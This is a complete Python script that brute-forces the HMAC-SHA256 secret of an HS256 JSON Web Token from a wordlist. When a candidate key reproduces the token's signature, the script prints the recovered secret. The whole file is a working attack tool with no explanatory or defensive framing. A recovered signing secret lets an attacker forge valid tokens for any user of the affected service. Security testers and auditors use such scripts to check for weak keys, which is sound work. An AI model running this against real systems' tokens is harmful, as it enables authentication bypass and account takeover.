#!/usr/bin/env python3
import hmac, hashlib, base64, argparse, sys

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

parser = argparse.ArgumentParser(description='Brute-force HMAC-SHA256 secret for a given HS256 JWT')
parser.add_argument('token', help='HS256 token to attack (header.payload.signature)')
parser.add_argument('--wordlist', default='../secrets/wordlist.txt', help='Wordlist path')
args = parser.parse_args()

parts = args.token.split('.')
if len(parts) != 3:
    print('Invalid token format')
    sys.exit(2)

header_payload = parts[0] + '.' + parts[1]
sig = parts[2]

with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
    for i, line in enumerate(f,1):
        key = line.strip().encode()
        mac = hmac.new(key, header_payload.encode(), hashlib.sha256).digest()
        if b64url(mac) == sig:
            print(f'FOUND secret on line {i}: {line.strip()}')
            sys.exit(0)
print('Secret not found in wordlist')
